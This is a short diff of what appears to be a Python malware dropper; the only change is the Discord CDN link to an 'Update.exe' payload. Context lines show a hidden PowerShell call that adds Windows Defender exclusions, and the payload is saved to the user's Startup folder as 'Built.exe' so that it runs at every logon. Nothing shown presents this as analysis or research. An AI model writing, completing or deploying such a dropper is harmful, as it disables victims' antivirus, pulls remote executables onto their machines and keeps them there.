@@ -90,7 +90,7 @@ Add-MpPreference -ExclusionPath ""
 '''
 subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
 
-url = "https://cdn.discordapp.com/attachments/1206721383820820553/1225855958110965840/Update.exe?ex=6622a653&is=66103153&hm=9d055dccffea6df355496fa942822fb73305fd7eca06cca9d79b7e1459ee9b58&"
+url = "https://cdn.discordapp.com/attachments/1206721383820820553/1231360800401395712/Update.exe?ex=6636ad1c&is=6624381c&hm=3e55371cf46dbf54bb5aa653f148b1c55184f46eeb4a17ee768c821283bd7c42&"
 destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
 
 if os.path.exists(destination):
